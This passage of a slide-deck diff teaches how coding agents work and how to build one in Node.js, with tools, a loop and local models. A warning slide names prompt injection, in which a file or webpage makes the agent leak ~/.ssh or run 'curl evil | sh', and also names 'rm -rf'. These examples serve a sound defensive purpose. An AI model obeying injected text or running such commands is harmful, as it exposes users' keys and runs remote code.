+            <span class="ico" style="font-size:1.6em; display:block; margin-bottom:6px;">💬</span>
+            <h3>Plain LLM</h3>
+            <p><small>You ask → it replies with text.</small></p>
+            <p class="muted"><small>It can <i>write</i> code, but it can't run it, read your files, or fix its own mistakes.</small></p>
+          </div>
+          <div class="card">
+            <span class="ico" style="font-size:1.6em; display:block; margin-bottom:6px;">🤖</span>
+            <h3 class="accent2">Coding Agent</h3>
+            <p><small>An LLM in a <b>loop</b>, given <b>tools</b> and a <b>goal</b>.</small></p>
+            <p class="muted"><small>It can read files, edit code, run commands, see the output, and try again — until the task is done.</small></p>
+          </div>
+        </div>
+        <blockquote><b>Coding agent = LLM + tools + a loop + a goal.</b> That's the whole trick.</blockquote>
+      </section>
+
+      <!-- 7c. Anatomy -->
+      <section>
+        <h2>Anatomy of a coding agent</h2>
+        <p class="muted">Think: a fast <b class="accent2">junior dev</b> — task + tools + feedback loop. Five simple parts:</p>
+        <aside class="notes">The junior-dev analogy: the task you hand them = the user prompt (goal); their keyboard &amp; terminal = tools (read/write/run); team guidelines = the system prompt; try→test→fix = the agent loop; their brain &amp; experience = the LLM. The one difference: it "thinks" by predicting text, and runs the whole loop in seconds.</aside>
+        <div class="anat">
+          <div class="card"><span class="ico">🧠</span><h3>Brain</h3><p>The LLM. Decides what to do next.</p></div>
+          <div class="card"><span class="ico">🖐️</span><h3>Tools</h3><p>Functions it can call: read, write, run.</p></div>
+          <div class="card"><span class="ico">🔁</span><h3>Loop</h3><p>Runs think→act→observe until done.</p></div>
+          <div class="card"><span class="ico">📝</span><h3>Memory</h3><p>The message history sent each turn.</p></div>
+          <div class="card"><span class="ico">🎯</span><h3>Goal</h3><p>The user's task + the system prompt rules.</p></div>
+        </div>
+        <p class="muted"><small>Take away the tools → it's just a chatbot. Take away the loop → it can only act once. Both together → an agent.</small></p>
+      </section>
+
+      <!-- 8. The agent loop -->
+      <section>
+        <h2>The agent loop</h2>
+        <div class="loop">
+          <span class="accent">┌──▶</span> <b>1. Think</b> — send goal + history to the LLM<br/>
+          <span class="muted">│</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<b>2. Decide</b> — LLM replies with an answer <span class="muted">OR</span> a <span class="accent2">tool call</span><br/>
+          <span class="muted">│</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<b>3. Act</b> — your code runs the tool <span class="muted">(read file, run cmd…)</span><br/>
+          <span class="muted">│</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<b>4. Observe</b> — feed the tool's result back to the LLM<br/>
+          <span class="accent">└──</span> <b>5. Repeat</b> until the LLM says "done" (no more tool calls)
+        </div>
+        <p><b>Tools</b> = functions you expose to the model (name + description + JSON parameters). The model doesn't run them — <span class="accent">it asks, your code executes.</span></p>
+        <aside class="notes">This loop is 90% of what Claude Code, Cursor, Aider, etc. do under the hood. The rest is polish: better prompts, more tools, safety checks, UI.</aside>
+      </section>
+
+      <!-- 8-viz. The agent loop as a diagram -->
+      <section>
+        <h2>The agent loop — visualized</h2>
+        <div style="width:100%; display:flex; justify-content:center;">
+        <svg viewBox="0 0 1060 430" style="width:100%; max-width:1020px; height:auto;" font-family="Inter, system-ui, sans-serif" role="img" aria-label="Agent loop diagram">
+          <defs>
+            <marker id="ah" markerWidth="10" markerHeight="10" refX="8" refY="3" orient="auto" markerUnits="strokeWidth">
+              <path d="M0,0 L8,3 L0,6 Z" fill="#9aa7b6"/>
+            </marker>
+            <marker id="ahO" markerWidth="10" markerHeight="10" refX="8" refY="3" orient="auto" markerUnits="strokeWidth">
+              <path d="M0,0 L8,3 L0,6 Z" fill="#f0a35e"/>
+            </marker>
+            <marker id="ahG" markerWidth="10" markerHeight="10" refX="8" refY="3" orient="auto" markerUnits="strokeWidth">
+              <path d="M0,0 L8,3 L0,6 Z" fill="#7bd88f"/>
+            </marker>
+          </defs>
+
+          <!-- User task -->
+          <rect x="20" y="176" width="150" height="72" rx="12" fill="#182430" stroke="#58c4dc" stroke-width="2"/>
+          <text x="95" y="206" text-anchor="middle" fill="#dfe6ee" font-size="20">👤 User</text>
+          <text x="95" y="230" text-anchor="middle" fill="#8b97a7" font-size="15">the task / goal</text>
+
+          <!-- LLM box -->
+          <rect x="235" y="158" width="210" height="108" rx="14" fill="#1b212b" stroke="#f0a35e" stroke-width="2.5"/>
+          <text x="340" y="196" text-anchor="middle" fill="#f0a35e" font-size="24">🧠 LLM</text>
+          <text x="340" y="223" text-anchor="middle" fill="#dfe6ee" font-size="16">Think &amp;</text>
+          <text x="340" y="245" text-anchor="middle" fill="#dfe6ee" font-size="16">decide next step</text>
+
+          <!-- Decision diamond -->
+          <polygon points="590,142 682,212 590,282 498,212" fill="#16202b" stroke="#58c4dc" stroke-width="2.5"/>
+          <text x="590" y="205" text-anchor="middle" fill="#58c4dc" font-size="15">Need a</text>
+          <text x="590" y="225" text-anchor="middle" fill="#58c4dc" font-size="15">tool?</text>
+
+          <!-- Run tool box -->
+          <rect x="740" y="52" width="290" height="96" rx="14" fill="#16201a" stroke="#7bd88f" stroke-width="2.5"/>
+          <text x="885" y="90" text-anchor="middle" fill="#7bd88f" font-size="22">🖐️ Your code runs it</text>
+          <text x="885" y="116" text-anchor="middle" fill="#8b97a7" font-size="15">read_file · write_file · run_command</text>
+          <text x="885" y="136" text-anchor="middle" fill="#8b97a7" font-size="14">…then observe the result</text>
+
+          <!-- Final answer box -->
+          <rect x="740" y="300" width="290" height="80" rx="14" fill="#172a1e" stroke="#7bd88f" stroke-width="2"/>
+          <text x="885" y="335" text-anchor="middle" fill="#7bd88f" font-size="22">✅ Final answer</text>
+          <text x="885" y="360" text-anchor="middle" fill="#8b97a7" font-size="15">back to the user</text>
+
+          <!-- Arrows -->
+          <!-- user -> llm -->
+          <line x1="170" y1="212" x2="230" y2="212" stroke="#9aa7b6" stroke-width="2.5" marker-end="url(#ah)"/>
+          <!-- llm -> diamond -->
+          <line x1="445" y1="212" x2="493" y2="212" stroke="#9aa7b6" stroke-width="2.5" marker-end="url(#ah)"/>
+          <!-- diamond -> run tool (yes) -->
+          <path d="M 640 175 C 690 140, 710 120, 748 108" fill="none" stroke="#7bd88f" stroke-width="2.5" marker-end="url(#ahG)"/>
+          <text x="690" y="150" fill="#7bd88f" font-size="15">yes</text>
+          <!-- diamond -> final answer (no) -->
+          <path d="M 640 249 C 690 285, 710 305, 748 322" fill="none" stroke="#7bd88f" stroke-width="2.5" marker-end="url(#ahG)"/>
+          <text x="672" y="300" fill="#7bd88f" font-size="15">no — done</text>
+          <!-- run tool -> back to llm (loop) -->
+          <path d="M 740 82 C 560 8, 430 8, 348 152" fill="none" stroke="#f0a35e" stroke-width="2.5" stroke-dasharray="7 5" marker-end="url(#ahO)"/>
+          <text x="470" y="28" text-anchor="middle" fill="#f0a35e" font-size="15">tool result → appended to history, loop again ↺</text>
+        </svg>
+        </div>
+        <p class="muted" style="text-align:center;"><small>The orange dashed arrow is the <b>loop</b>: every tool result is fed back so the model keeps going until it's done.</small></p>
+      </section>
+
+      <!-- 8a. How a tool call actually works -->
+      <section>
+        <h2>How a "tool call" actually works</h2>
+        <p class="muted">The #1 confusion. The model <b>never</b> runs code — it just <i>asks</i>, in structured text.</p>
+        <div class="loop">
+          <span class="step">1.</span> You tell the model which tools exist <span class="muted">(name + description + params)</span><br/>
+          <span class="step">2.</span> Instead of plain text, the model can reply: <span class="accent2">"call <b>read_file</b> with <code>{path:'app.js'}</code>"</span><br/>
+          <span class="step">3.</span> <b>Your code</b> sees that request and actually runs the function<br/>
+          <span class="step">4.</span> You paste the result back into the conversation<br/>
+          <span class="step">5.</span> The model reads the result and decides the next step
+        </div>
+        <p><span class="accent">Tool call = a structured request. Your code decides whether to execute it.</span></p>
+        <aside class="notes">The LLM is the decider; your program is the doer — the "tool call" is just JSON the model emits and you interpret. This separation is why agents are safe-ish: nothing runs unless YOUR code chooses to run it. You can log, sandbox, or ask for approval in between.</aside>
+      </section>
+
+      <!-- 8b. Walkthrough: a real task step by step -->
+      <section>
+        <h2>The flow, step by step 🎬</h2>
+        <p class="muted">Task: <em>"Add a <code>subtract()</code> function to <code>math.js</code> and prove it works."</em></p>
+        <div class="trace">
+          <div class="msg user"><span class="who">USER</span> Add a <code>subtract()</code> function to <code>math.js</code> and prove it works.</div>
+          <div class="msg bot"><span class="who">AGENT</span> Let me see the file first. <em>→ calls <code>read_file({ path: "math.js" })</code></em></div>
+          <div class="msg tool"><span class="who">TOOL</span> read_file → "export const add = (a, b) =&gt; a + b;"</div>
+          <div class="msg bot"><span class="who">AGENT</span> I'll append subtract. <em>→ calls <code>write_file({ path: "math.js", content: "…" })</code></em></div>
+          <div class="msg tool"><span class="who">TOOL</span> write_file → "Wrote 84 chars to math.js"</div>
+          <div class="msg bot"><span class="who">AGENT</span> Now verify it. <em>→ calls <code>run_command({ cmd: "node -e 'import(\"./math.js\").then(m=&gt;console.log(m.subtract(5,3)))'" })</code></em></div>
+          <div class="msg tool"><span class="who">TOOL</span> run_command → "2"</div>
+          <div class="msg done"><span class="who">AGENT</span> ✅ Done — added <code>subtract()</code>; calling <code>subtract(5, 3)</code> returned 2 as expected.</div>
+        </div>
+        <p class="muted"><small>Each grey/green line is appended to the history, so every turn the model sees everything that happened so far.</small></p>
+      </section>
+
+      <!-- 8c. Self-correction -->
+      <section>
+        <h2>Why the loop is powerful: self-correction</h2>
+        <p class="muted">The magic isn't one perfect answer — it's <b>seeing the result and trying again</b>.</p>
+        <div class="trace">
+          <div class="msg bot"><span class="who">AGENT</span> Run the tests. <em>→ calls <code>run_command({ cmd: "node test.js" })</code></em></div>
+          <div class="msg tool"><span class="who">TOOL</span> run_command → "❌ ReferenceError: subtract is not defined"</div>
+          <div class="msg bot"><span class="who">AGENT</span> Ah — I forgot to <b><code>export</code></b> it. Fixing the file. <em>→ calls <code>write_file(…)</code></em></div>
+          <div class="msg tool"><span class="who">TOOL</span> write_file → "Wrote 96 chars to math.js"</div>
+          <div class="msg bot"><span class="who">AGENT</span> Re-run the tests. <em>→ calls <code>run_command({ cmd: "node test.js" })</code></em></div>
+          <div class="msg tool"><span class="who">TOOL</span> run_command → "✅ All 3 tests passed"</div>
+          <div class="msg done"><span class="who">AGENT</span> ✅ Fixed the missing <code>export</code>; all tests pass now.</div>
+        </div>
+        <p><span class="accent">Feed the error back → the model debugs itself.</span> That feedback loop is what makes agents feel smart.</p>
+      </section>
+
+      <!-- 8b. Terminology: the three roles -->
+      <section>
+        <h2>Terminology — the conversation</h2>
+        <p class="muted">Every message in the loop has a <b>role</b>. This "conversation history" is the agent's memory.</p>
+        <div class="cols3">
+          <div class="card">
+            <span class="ico" style="font-size:1.6em; display:block; margin-bottom:6px;">⚙️</span>
+            <h3>system</h3>
+            <p><small>Sets the agent's behavior, rules, and available context. Written once, front-loaded.</small></p>
+          </div>
+          <div class="card">
+            <span class="ico" style="font-size:1.6em; display:block; margin-bottom:6px;">🙋</span>
+            <h3>user</h3>
+            <p><small>The human's request / task, plus tool results fed back in.</small></p>
+          </div>
+          <div class="card">
+            <span class="ico" style="font-size:1.6em; display:block; margin-bottom:6px;">🤖</span>
+            <h3>assistant</h3>
+            <p><small>The LLM's reply — either a text answer <b>or</b> a request to call a tool.</small></p>
+          </div>
+        </div>
+        <p class="muted"><small>The loop = read input → append to history → send to LLM → run any tool → append result → repeat.</small></p>
+        <aside class="notes">Matches the Stanford CS146S framing: system/user/assistant prompts; the client executes tool calls outside the LLM.</aside>
+      </section>
+
+      <!-- ===================== PART 2 ===================== -->
+      <section class="title" data-background-color="#101820">
+        <div class="kicker">Part 2</div>
+        <h1 class="accent2">Build a coding agent in Node.js</h1>
+        <p class="muted">~80 lines. Works with Claude, Gemini, GPT — and later, a local model.</p>
+      </section>
+
+      <!-- 8z. What we're about to build (chat mockup) -->
+      <section>
+        <h2>What we're about to build</h2>
+        <div class="chatwin">
+          <div class="chatbar"><span class="d r"></span><span class="d y"></span><span class="d g"></span><span class="ct">mini-agent — your own coding agent</span></div>
+          <div class="chatbody">
+            <div class="b user">Create hello.js that prints 1 to 10, then run it.</div>
+            <div class="b ai">
+              <div class="act">wrote <b>hello.js</b></div>
+              <div class="act">ran <code>node hello.js</code></div>
+              <div class="out">1 2 3 4 5 6 7 8 9 10</div>
+              <div>Done — created the file and ran it. Output looks correct.</div>
+            </div>
+          </div>
+          <div class="composer"><span>Ask your agent to do something…</span><span class="send">Send</span></div>
+        </div>
+        <p class="muted" style="text-align:center;"><small>In ~80 lines of Node.js you'll build exactly this: a chat box that can <b>read</b>, <b>edit</b>, and <b>run</b> code.</small></p>
+      </section>
+
+      <!-- 9. Prereqs / setup -->
+      <section>
+        <h2>Step 0 — Project setup</h2>
+        <pre><code data-trim data-noescape class="language-bash">mkdir mini-agent && cd mini-agent
+npm init -y
+npm pkg set type=module          # enable ES modules (import/export)
+
+# install ONE provider SDK (they're interchangeable — pick yours):
+npm install openai               # OpenAI GPT  (also talks to Ollama!)
+npm install @anthropic-ai/sdk    # Anthropic Claude
+npm install @google/genai        # Google Gemini
+</code></pre>
+        <p class="muted"><small>Requires <b>Node 18+</b> (you have v24). Put your key in an env var, never in code:
+        <code>export OPENAI_API_KEY=sk-...</code></small></p>
+      </section>
+
+      <!-- 10. Step 1 basic call - three providers -->
+      <section>
+        <h2>Step 1 — Say hello to a model</h2>
+        <p class="muted">Same idea in every SDK — send messages, get text back.</p>
+        <div class="cols3" style="gap:16px;">
+          <div>
+            <p class="step">OpenAI (GPT)</p>
+            <pre style="font-size:0.4em;"><code data-trim data-noescape class="language-javascript">import OpenAI from "openai";
+const openai = new OpenAI();
+
+const r = await openai.chat.completions
+  .create({
+    model: "gpt-5.5",
+    messages: [{ role: "user",
+      content: "Hi in 3 words" }],
+  });
+console.log(
+  r.choices[0].message.content);
+</code></pre>
+          </div>
+          <div>
+            <p class="step">Anthropic (Claude)</p>
+            <pre style="font-size:0.4em;"><code data-trim data-noescape class="language-javascript">import Anthropic from "@anthropic-ai/sdk";
+const anthropic = new Anthropic();
+
+const r = await anthropic.messages
+  .create({
+    model: "claude-sonnet-5",
+    max_tokens: 1024,
+    messages: [{ role: "user",
+      content: "Hi in 3 words" }],
+  });
+console.log(r.content[0].text);
+</code></pre>
+          </div>
+          <div>
+            <p class="step">Google Gemini</p>
+            <pre style="font-size:0.4em;"><code data-trim data-noescape class="language-javascript">import { GoogleGenAI }
+  from "@google/genai";
+const ai = new GoogleGenAI({});
+
+const r = await ai.models
+  .generateContent({
+    model: "gemini-2.5-flash",
+    contents: "Hi in 3 words",
+  });
+console.log(r.text);
+</code></pre>
+          </div>
+        </div>
+        <p class="muted"><small>Keys come from env vars (<code>OPENAI_API_KEY</code>, …). We'll build the full agent with the <b>OpenAI SDK</b> — the same code drives <b>Ollama / Qwen3</b> locally later.</small></p>
+      </section>
+
+      <!-- 11. Step 2 define tools -->
+      <section>
+        <h2>Step 2 — Describe the tools</h2>
+        <p class="muted">A tool is just a name + description + parameters. This is what the model reads.</p>
+        <pre><code data-trim data-noescape class="language-javascript">const tools = [
+  {
+    name: "read_file",
+    description: "Read a file",
+    parameters: { path: "string" },
+  },
+  {
+    name: "write_file",
+    description: "Write text to a file",
+    parameters: { path: "string", content: "string" },
+  },
+  {
+    name: "run_command",
+    description: "Run a shell command",
+    parameters: { cmd: "string" },
+  },
+];
+</code></pre>
+        <p class="muted"><small>(Simplified. The real OpenAI/Claude SDKs want a slightly more verbose JSON-schema shape — same idea.)</small></p>
+      </section>
+
+      <!-- 12. Step 2b implement tools -->
+      <section>
+        <h2>Step 2b — Implement the tools</h2>
+        <p class="muted">Plain Node functions — the "hands" of the agent.</p>
+        <pre><code data-trim data-noescape class="language-javascript">import fs from "node:fs/promises";
+import { execSync } from "node:child_process";
+
+const handlers = {
+  read_file:   ({ path })          => fs.readFile(path, "utf8"),
+  write_file:  ({ path, content }) => fs.writeFile(path, content),
+  run_command: ({ cmd })           => execSync(cmd).toString(),
+};
+</code></pre>
+        <p class="muted"><small>Note: <code>run_command</code> runs real shell commands — in production you'd sandbox it or ask for approval first.</small></p>
+      </section>
+
+      <!-- 12c. One call to the model WITH tools (demo) -->
+      <section>
+        <h2>Step 2c — Call the model <em>with tools</em> 🎬</h2>
+        <p class="muted">Before the loop: what happens in <b>one</b> call once the model has tools?</p>
+        <pre><code data-trim data-noescape class="language-javascript">const messages = [
+  { role: "user", content: "Create hello.js that prints 'hi'." },
+];
+
+// Hand the model the tool schemas from Step 2:
+const reply = await callModel(messages, tools);
+
+console.log(reply.tool_calls);
+// → [{ name: "write_file",
+//      args: { path: "hello.js", content: "console.log('hi')" } }]</code></pre>
+        <p><span class="accent">The model didn't create the file</span> — it asked your program to call <code>write_file()</code>. Put this call in a loop → agent. ↓</p>
+        <aside class="notes">This is the single most important idea in the talk. The LLM never touches your machine — it returns a tool_calls array and stops; the client decides whether to execute it. Great spot for the live demo: run this once against Qwen3 4B and show the tool_calls output. Step 3 literally just loops this call and feeds each tool result back into messages.</aside>
+      </section>
+
+      <!-- 13. Step 3 the loop -->
+      <section>
+        <h2>Step 3 — The agent loop</h2>
+        <p class="muted">This is the whole flow. Read it top to bottom.</p>
+        <pre><code data-trim data-noescape class="language-javascript">const messages = [
+  { role: "system", content: "You are a coding agent. Use tools to finish the task." },
+  { role: "user",   content: "Create hello.js that prints 1 to 10, then run it." },
+];
+
+while (true) {
+  // 1. Ask the model what to do next
+  const reply = await callModel(messages, tools);
+  messages.push(reply);
+
+  // 2. No tool requested -> the model is done
+  if (!reply.tool_calls) {
+    console.log(reply.content);
+    break;
+  }
+
+  // 3. Run each requested tool, add the result back to the history
+  for (const call of reply.tool_calls) {
+    const result = await handlers[call.name](call.args);
+    messages.push({ role: "tool", content: String(result) });
+  }
+  // 4. Loop again -> the model now sees the result
+}
+</code></pre>
+        <aside class="notes">This while-loop IS the agent. callModel() just wraps the SDK call. Everything commercial is this plus more tools, better prompts, guardrails, and a UI.</aside>
+      </section>
+
+      <!-- 14. Run it -->
+      <section>
+        <h2>Step 4 — What happens when it runs</h2>
+        <pre><code data-trim data-noescape class="language-text">user:  Create hello.js that prints 1 to 10, then run it.
+
+model: (tool) write_file  path=hello.js
+model: (tool) run_command cmd=node hello.js
+tool:  1 2 3 4 5 6 7 8 9 10
+model: Done. Created hello.js and ran it.</code></pre>
+        <p class="good">That is a working coding agent — one loop, a few tools.</p>
+      </section>
+
+      <!-- 14b. Put it all together -->
+      <section>
+        <h2>Step 5 — Put it all together</h2>
+        <p class="muted">The whole thing is one file, <code>agent.js</code> — the 4 pieces from Steps 1–3 wired up:</p>
+        <pre style="font-size:0.4em;"><code data-trim data-noescape class="language-javascript">import OpenAI from "openai";
+
+const openai = new OpenAI();                       // 1 · the model client
+
+const tools = [ /* read_file, write_file, run_command — Step 2 */ ];
+
+const handlers = { /* read_file, write_file, run_command — Step 2b */ };  // 2 · the tool functions
+
+const messages = [                                 // 3 · the conversation
+  { role: "system", content: "You are a coding agent. Use tools to finish the task." },
+  { role: "user",   content: process.argv[2] },    // task from the command line
+];
+
+while (true) {                                     // 4 · the loop
+  const res   = await openai.chat.completions.create({ model: "gpt-5.5", messages, tools });
+  const reply = res.choices[0].message;
+  messages.push(reply);
+
+  if (!reply.tool_calls) { console.log(reply.content); break; }   // done
+
+  for (const call of reply.tool_calls) {           // run tools, feed results back
+    const args   = JSON.parse(call.function.arguments);
+    const result = await handlers[call.function.name](args);
+    messages.push({ role: "tool", tool_call_id: call.id, content: String(result) });
+  }
+}</code></pre>
+        <p class="muted"><small>Run it: <code>node agent.js "Create hello.js that prints 1 to 10, then run it"</code> — that's the whole agent. It runs, but a bare prompt is fragile — let's make it reliable ↓</small></p>
+      </section>
+
+      <!-- 14b2. Refine the prompt: constraints + stop condition -->
+      <section>
+        <h2>Step 6 — Add rules + stop condition</h2>
+        <p class="muted">A bare prompt works in the demo but drifts on real tasks. Two levers make it reliable: <b class="accent">constraints</b> + a <b class="accent2">stop condition</b>.</p>
+        <pre style="font-size:0.44em;"><code data-trim data-noescape class="language-javascript">const SYSTEM = `You are a coding agent. Use tools to finish the task.
+
+Rules:                     // ← guide the model
+- Work only inside ./workspace.
+- Read before editing.
+- Ask approval before destructive commands.
+
+Done:                      // ← when to stop calling tools
+- Verify after changes.
+- Final answer only after verification.
+- If stuck, explain why and stop.`;</code></pre>
+        <p class="muted"><small>Also cap the loop: <code>while (n++ &lt; 20) { … }</code>. <b>Rules guide the model; the loop cap protects your program.</b></small></p>
+        <aside class="notes">The stop condition tells the model when to stop requesting tools and return a final answer (the loop ends when the model replies without tool_calls). Important: the prompt only *guides* the model — the workspace boundary, the approval gate, and the loop cap must be <b>enforced by your code</b>. An agent can't truly "ask approval" unless your tool runner supports it. Mirrors the homework's workspace + approval requirements.</aside>
+      </section>
+
+      <!-- 14c. Sandbox / this is a demo -->
+      <section>
+        <h2>⚠️ It's a demo — real agents need a sandbox</h2>
+        <p class="muted"><code>run_command</code> runs <b>whatever the model says</b>, straight on your machine — fine for learning, risky for real tasks.</p>
+        <div class="cols">
+          <div class="card">
+            <h3 class="accent2">Why that's risky</h3>
+            <ul style="font-size:0.8em;">
+              <li><b>Hallucination</b> → a destructive command <span class="muted">(<code>rm -rf</code>, overwrite files)</span></li>
+              <li><b>Prompt injection</b> → a file/webpage tells it to leak <code>~/.ssh</code> or run <code>curl evil | sh</code></li>
+              <li><b>No undo</b> — by the time you see it, it already ran</li>
+            </ul>
+          </div>
+          <div class="card">
+            <h3 class="good">What a sandbox gives you</h3>
+            <ul style="font-size:0.8em;">
+              <li><b>Isolation</b> — a container/VM that can't touch your real files or keys</li>
+              <li><b>Restricted network</b>, resource &amp; time limits, non-root</li>
+              <li>Plus <b>command allow-list</b> &amp; <b>human approval</b> for risky actions</li>
+            </ul>
+          </div>
+        </div>
+        <p class="muted" style="text-align:center; margin-top:10px;"><small>For this course: run it on a <b>throwaway folder</b>. For real use → <b>sandbox the tools</b> (Docker, a VM, or a hosted agent runtime).</small></p>
+      </section>
+
+      <!-- 15. Provider comparison -->
+      <section>
+        <h2>Choosing a model — cloud or local</h2>
+        <div class="cols3" style="margin-top:14px;">
+          <div class="card"><span class="ico" style="font-size:1.6em; display:block; margin-bottom:6px;">☁️</span><h3 class="accent2">Best cloud</h3><p><small><b>Claude</b> / <b>GPT-5.5</b> — top coding &amp; agents · paid</small></p></div>
+          <div class="card"><span class="ico" style="font-size:1.6em; display:block; margin-bottom:6px;">💸</span><h3 class="accent">Cheap cloud</h3><p><small><b>Gemini Flash</b> / <b>DeepSeek</b> — low cost · free tiers</small></p></div>
+          <div class="card"><span class="ico" style="font-size:1.6em; display:block; margin-bottom:6px;">🖥️</span><h3 class="good">Local</h3><p><small><b>Ollama + Qwen3</b> — free · offline · private</small></p></div>
+        </div>
+        <p class="muted" style="margin-top:18px;">Same agent loop for all three — swap the SDK / <code>baseURL</code>, keep the code.</p>
+        <p class="muted"><small><span class="accent2">Note:</span> some chat-only models (e.g. Gemma 3) have <b>no</b> tool calling — avoid them for agents. Full model &amp; price tables next ↓ <i>(reference)</i></small></p>
+        <aside class="notes">Cloud in full — Anthropic Claude Opus/Sonnet (top coding &amp; agents), OpenAI GPT-5.5 / 5.4 (huge ecosystem), Google Gemini 2.5 (cheap, free tier), xAI Grok 4, DeepSeek V3 (very cheap), Mistral Large (EU). Local via Ollama — Qwen3 (our pick: strong local tool-calling), gpt-oss, Llama 3.3/4, DeepSeek-R1, Devstral. Most support tool/function calling depending on provider &amp; runtime.</aside>
+      </section>
+
+      <!-- 15b. Pricing -->
+      <section>
+        <h2>Price reference — paid models <span class="muted" style="font-size:0.5em;">(reference · skim)</span></h2>
+        <table style="font-size:0.5em; line-height:1.25;">
+          <thead><tr><th>Provider</th><th>Model</th><th>Input&nbsp;$/1M</th><th>Output&nbsp;$/1M</th><th>Note</th></tr></thead>
+          <tbody>
+            <tr><td><b>Anthropic</b></td><td>Claude Opus 4.8</td><td>$5.00</td><td>$25.00</td><td>most capable</td></tr>
+            <tr><td><b>Anthropic</b></td><td>Claude Sonnet 5</td><td>$2.00</td><td>$10.00</td><td>balanced · now; → $3/$15 from Sep 1</td></tr>
+            <tr><td><b>Anthropic</b></td><td>Claude Haiku 4.5</td><td>$1.00</td><td>$5.00</td><td>fast &amp; cheap</td></tr>
+            <tr><td><b>OpenAI</b></td><td>GPT-5.5</td><td>$5.00</td><td>$30.00</td><td>flagship</td></tr>
+            <tr><td><b>OpenAI</b></td><td>GPT-5.4</td><td>$2.50</td><td>$15.00</td><td>balanced</td></tr>
+            <tr><td><b>Google</b></td><td>Gemini 2.5 Flash</td><td>$0.30</td><td>$2.50</td><td>cheap · free tier</td></tr>
+            <tr><td><b>Google</b></td><td>Gemini 2.5 Pro</td><td>$1.25</td><td>$10.00</td><td>stronger</td></tr>
+            <tr><td><b>xAI</b></td><td>Grok 4</td><td>~$2.00</td><td>~$6.00</td><td>—</td></tr>
+            <tr><td><b>DeepSeek</b></td><td>DeepSeek V3</td><td>$0.27</td><td>$1.10</td><td>very cheap</td></tr>
+            <tr><td><b>Mistral</b></td><td>Mistral Large</td><td>$2.00</td><td>$6.00</td><td>EU</td></tr>
+            <tr><td class="good"><b>Ollama + Qwen3</b></td><td>qwen3:4b (local)</td><td class="good">$0</td><td class="good">$0</td><td class="good"><b>free &amp; offline</b></td></tr>
+          </tbody>
+        </table>
+        <p class="muted" style="margin-top:6px;"><small>Approx. list prices / 1M tokens (~mid-2026) — <b>verify on each provider's page</b>.</small></p>
+        <aside class="notes">Agents make many calls, so cost adds up — you pay per token, input + output. Batch &amp; cached tiers are cheaper; local models cost only your own hardware/electricity. This slide is a reference — skim it live, don't read every row.</aside>
+      </section>
+
+      <!-- ===================== PART 3 ===================== -->
+      <section class="title" data-background-color="#101820">
+        <div class="kicker">Part 3</div>
+        <h1 class="good">Offline &amp; free with Ollama + Qwen3</h1>
+        <p class="muted">Run a capable model on your own machine. No API key, no bill, no data leaving your laptop.</p>
+      </section>
+
+      <!-- 16. Why local -->
+      <section>
+        <h2>Why run a model locally?</h2>
+        <p class="muted">Four reasons developers keep a local model around:</p>
+        <div class="anat" style="grid-template-columns: repeat(4, 1fr); margin-top: 10px;">
+          <div class="card"><span class="ico">💸</span><h3 class="good">Free</h3><p>No per-token bill, ever.</p></div>
+          <div class="card"><span class="ico">🔒</span><h3 class="good">Private</h3><p>Your code never leaves the machine.</p></div>
+          <div class="card"><span class="ico">✈️</span><h3 class="good">Offline</h3><p>Works on a plane or air-gapped.</p></div>
+          <div class="card"><span class="ico">♾️</span><h3 class="good">Unlimited</h3><p>Experiment as much as you want.</p></div>
+        </div>
+        <p class="muted" style="text-align:center; margin-top:22px;"><small><b>Ollama</b> = the easiest way to download &amp; run open models · <b>Qwen3</b> (Alibaba) is strong at <b>tool calling</b>, exactly what agents need.</small></p>
+      </section>
+
+      <!-- 16-tradeoffs. Local trade-offs -->
+      <section>
+        <h2>Local trade-offs — be realistic</h2>
+        <p class="muted">Free and private, but not magic. Know what you're giving up:</p>
+        <div class="anat" style="grid-template-columns: repeat(3, 1fr); margin-top: 10px;">
+          <div class="card"><span class="ico">⚙️</span><h3 class="accent2">Hardware</h3><p>Needs decent RAM/GPU — bigger models need more.</p></div>
+          <div class="card"><span class="ico">📉</span><h3 class="accent2">Capability</h3><p>Small local models trail frontier cloud models a bit.</p></div>
+          <div class="card"><span class="ico">🔧</span><h3 class="accent2">Maintenance</h3><p>You manage the models and updates yourself.</p></div>
+        </div>
+        <blockquote style="margin-top:22px;">Good news: for <b>learning</b> and everyday coding tasks, a local <b>Qwen3</b> is more than enough — and you can always fall back to a cloud API for the hardest jobs.</blockquote>
+      </section>
+
+      <!-- 16b. Free models compared + why Qwen3 -->
+      <section>
+        <h2>Free local models — and why Qwen3</h2>
+        <div class="cols">
+          <div>
+            <table style="font-size:0.52em;">
+              <thead><tr><th>Model</th><th>Tools</th><th>Code</th><th>Sizes</th><th>Best for</th></tr></thead>
+              <tbody>
+                <tr><td class="accent2"><b>Qwen3</b></td><td>★★★</td><td>★★★</td><td>0.6–32B</td><td><b>best demo pick</b></td></tr>
+                <tr><td><b>Devstral</b></td><td>★★★</td><td>★★★</td><td>24B</td><td>alternative — coding</td></tr>
+                <tr><td><b>DeepSeek-R1</b></td><td>★★☆</td><td>★★★</td><td>1.5–70B</td><td>alternative — reasoning</td></tr>
+                <tr><td><b>Gemma 3</b></td><td>✗ none</td><td>★★☆</td><td>1–27B</td><td>chat-only, <b>avoid</b></td></tr>
+              </tbody>
+            </table>
+            <p class="muted"><small>★ = relative strength · "Tools" = tool-calling reliability.</small></p>
+          </div>
+          <div class="card">
+            <h3 class="good">Why Qwen3 for this demo</h3>
+            <ul style="font-size:0.72em;">
+              <li><b>Strong, reliable tool calling</b> for a local model — rarely malforms tool JSON</li>
+              <li><b>Fits modest laptops</b> — 4B ≈ ~3 GB RAM, runs on almost any machine</li>
+              <li>Solid at <b>code + reasoning</b>, many sizes (0.6B → 32B)</li>
+              <li>Uses the <b>OpenAI-compatible</b> endpoint → <span class="accent">zero code change</span></li>
+            </ul>
+          </div>
+        </div>
+      </section>
+
+      <!-- 16c. Hardware requirements -->
+      <section>
+        <h2>What hardware do you actually need?</h2>
+        <p class="muted">Rough rule of thumb at <b>Q4</b>: <b class="accent">RAM ≈ model size (B) × ~0.7 GB</b>. No GPU required — CPU / Apple Silicon just runs slower.</p>
+        <table style="font-size:0.6em; margin-top:14px;">
+          <thead><tr><th>Model</th><th>RAM / VRAM (Q4)</th><th>Runs comfortably on</th><th>Feel</th></tr></thead>
+          <tbody>
